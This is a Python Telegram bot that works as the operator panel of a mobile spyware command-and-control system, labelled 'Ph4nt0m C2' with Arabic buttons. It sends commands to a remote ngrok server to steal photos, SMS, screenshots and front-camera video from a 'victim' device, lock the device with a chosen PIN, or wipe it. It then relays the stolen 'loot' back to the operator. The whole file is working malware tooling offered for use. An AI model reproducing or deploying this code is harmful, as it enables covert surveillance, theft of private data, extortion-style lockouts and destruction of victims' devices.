#!/usr/bin/env python3
import os, json, requests, time, base64
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, ConversationHandler, MessageHandler, filters

SERVER_URL = "https://d932-2001-16a4-2f8-adf9-ac8c-c4ff-fef6-f51.ngrok-free.app"
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_TOKEN")
ASK_PIN, ASK_NOTIFY = 1, 2
last_loot_time = 0

def send_command(action, params=None):
    try:
        r = requests.post(f"{SERVER_URL}/command", json={"action":action,"params":params or {}}, timeout=10)
        return r.json()
    except: return {"status":"error"}

def get_new_loot():
    global last_loot_time
    try:
        r = requests.get(f"{SERVER_URL}/loot?since={last_loot_time}", timeout=10)
        data = r.json()
        for item in data.get('loot', []):
            if item['timestamp'] > last_loot_time:
                last_loot_time = item['timestamp']
        return data.get('loot', [])
    except: return []

def ckbd():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📷 فحص الصور", callback_data='scan_photos'), InlineKeyboardButton("📋 معلومات", callback_data='get_info')],
        [InlineKeyboardButton("🖼️ لقطة شاشة", callback_data='screenshot'), InlineKeyboardButton("🎥 فيديو امامي", callback_data='record_video')],
        [InlineKeyboardButton("📳 اهتزاز", callback_data='vibrate'), InlineKeyboardButton("🔊 صوت", callback_data='play_sound')],
        [InlineKeyboardButton("🔦 فلاش ON", callback_data='flash_on'), InlineKeyboardButton("💡 فلاش OFF", callback_data='flash_off')],
        [InlineKeyboardButton("💬 سحب SMS", callback_data='get_sms'), InlineKeyboardButton("🔔 إشعار", callback_data='send_notify')],
        [InlineKeyboardButton("🔒 قفل", callback_data='set_pin'), InlineKeyboardButton("💣 فرمتة", callback_data='format')],
        [InlineKeyboardButton("📂 عرض المسروقات", callback_data='show_loot')]
    ])

async def start(update, context):
    await update.message.reply_text("⚡ **Ph4nt0m C2**", reply_markup=ckbd())

async def handle(update, context):
    q = update.callback_query
    await q.answer()
    d = q.data

    if d == 'set_pin':
        await q.edit_message_text("🔢 أرسل PIN:")
        return ASK_PIN
    if d == 'send_notify':
        await q.edit_message_text("🔔 أرسل نص الإشعار:")
        return ASK_NOTIFY
    if d == 'show_loot':
        loot = get_new_loot()
        if not loot:
            await q.edit_message_text("لا توجد مسروقات جديدة.", reply_markup=ckbd())
            return
        for item in loot[-5:]:
            if item.get('info'):
                await q.message.reply_text(f"📋 {json.dumps(item['info'], ensure_ascii=False)[:3000]}")
            elif item.get('data'):
                try:
                    ext = 'png' if item.get('type') in ('screenshot','photo') else 'webm' if item.get('type')=='video' else 'bin'
                    await q.message.reply_document(document=base64.b64decode(item['data']), filename=item.get('name',f"file.{ext}"))
                except: pass
        await q.edit_message_text("✅ تم العرض", reply_markup=ckbd())
        return

    result = send_command(d)
    if result.get('status') in ('ok','pending'):
        await q.edit_message_text(f"✅ تم: {d}", reply_markup=ckbd())
        time.sleep(2)
        # جلب المسروقات تلقائياً
        loot = get_new_loot()
        if loot:
            for item in loot[-3:]:
                if item.get('info'):
                    await q.message.reply_text(f"📋 {json.dumps(item['info'], ensure_ascii=False)[:2000]}")
                elif item.get('data'):
                    try:
                        ext = 'png' if item.get('type') in ('screenshot','photo') else 'webm' if item.get('type')=='video' else 'bin'
                        await q.message.reply_document(document=base64.b64decode(item['data']), filename=item.get('name',f"file.{ext}"))
                    except: pass
    else:
        await q.edit_message_text(f"❌ فشل: لا يوجد ضحية متصل", reply_markup=ckbd())

async def pin_input(update, context):
    pin = update.message.text.strip()
    if len(pin)!=4 or not pin.isdigit():
        await update.message.reply_text("❌ 4 أرقام:"); return ASK_PIN
    send_command('lock_screen', {'pin':pin})
    await update.message.reply_text(f"🔒 تم: {pin}")
    return ConversationHandler.END

async def notify_input(update, context):
    msg = update.message.text.strip()
    send_command('send_notification', {'message':msg})
    await update.message.reply_text(f"🔔 تم: {msg}")
    return ConversationHandler.END

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(handle, pattern='^set_pin$'), CallbackQueryHandler(handle, pattern='^send_notify$')],
        states={ASK_PIN:[MessageHandler(filters.TEXT & ~filters.COMMAND, pin_input)], ASK_NOTIFY:[MessageHandler(filters.TEXT & ~filters.COMMAND, notify_input)]},
        fallbacks=[]
    )
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle))
    app.add_handler(conv)
    print("🤖 Ready")
    app.run_polling()

if __name__=="__main__":
    main()
